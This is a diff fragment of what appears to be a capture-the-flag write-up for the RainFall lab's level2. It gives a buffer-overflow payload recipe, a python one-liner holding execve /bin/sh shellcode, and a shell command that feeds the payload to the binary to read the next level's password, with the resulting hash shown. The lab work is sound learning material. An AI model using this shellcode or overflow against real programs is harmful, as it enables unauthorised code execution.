@@ -88,14 +88,14 @@ Program received signal SIGSEGV, Segmentation fault.
 
 The exploit recipe is : `X * "\x90" + ShellCode(size = 21) + Y "\90" + "strdup() return address"` - `TOTAL SIZE = EIP SIZE = 80`
 
-#### Our Payload
+### Payload
 
 `python -c 'print "\x90"*20 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*39 + "\x08\xa0\x04\x08"' > /tmp/payload`
 
 Now we can try to load the payload inside our program.
 
 ```shell
-level2@RainFall:~$ (cat /tmp/payload_; echo "cat /home/user/level3/.pass") | ./level2
+level2@RainFall:~$ (cat /tmp/payload; echo "cat /home/user/level3/.pass") | ./level2
 ��������������������j
                      X�Rh//shh/bin��1�̀����������������������������������
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
